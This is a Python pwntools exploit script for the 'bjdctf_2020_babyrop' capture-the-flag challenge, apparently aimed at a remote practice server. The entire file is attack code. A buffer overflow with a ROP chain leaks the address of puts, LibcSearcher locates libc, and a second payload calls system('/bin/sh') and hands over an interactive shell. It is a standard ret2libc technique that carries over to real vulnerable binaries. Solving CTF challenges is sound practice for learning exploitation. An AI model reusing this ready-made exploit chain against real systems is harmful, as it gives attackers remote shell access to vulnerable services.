from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 28823)
e = ELF('bjdctf_2020_babyrop')
puts_plt = e.plt['puts']
log.success('puts_plt => %s' % hex(puts_plt))
puts_got = e.got['puts']
log.success('puts_got => %s' % hex(puts_got))
main_address = e.symbols['main']
log.success('main_address => %s' % hex(main_address))
pop_rdi = 0x400733 # ROPgadget --binary ./bjdctf_2020_babyrop --only "pop|ret"
payload = b'a'*0x20 + b'fuckpwn!' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_address)
io.sendlineafter(b'Pull up your sword and tell me u story!\n', payload)
puts_address = u64(io.recvline().strip(b'\n').ljust(8, b'\x00'))
log.success('puts_address => %s' % hex(puts_address))
libc = LibcSearcher('puts', puts_address) # 获取libc版本, libc6_2.23-0ubuntu11_amd64
libcbase = puts_address - libc.dump('puts') # libc的基址=puts()函数地址-puts()函数偏移地址
log.success('libcbase_address => %s' % hex(libcbase))
system_address = libcbase + libc.dump('system') # system()函数的地址=libc的基址+system()函数偏移地址
log.success('system_address => %s' % hex(system_address))
bin_sh_address = libcbase + libc.dump('str_bin_sh') # '/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址
log.success('bin_sh_address => %s' % hex(bin_sh_address))
pop_ret = 0x4004c9 # ROPgadget --binary ./bjdctf_2020_babyrop --only "pop|ret"
payload = b'a'*0x20 + b'fuckpwn!' + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
io.sendlineafter(b'Pull up your sword and tell me u story!\n', payload)
io.interactive()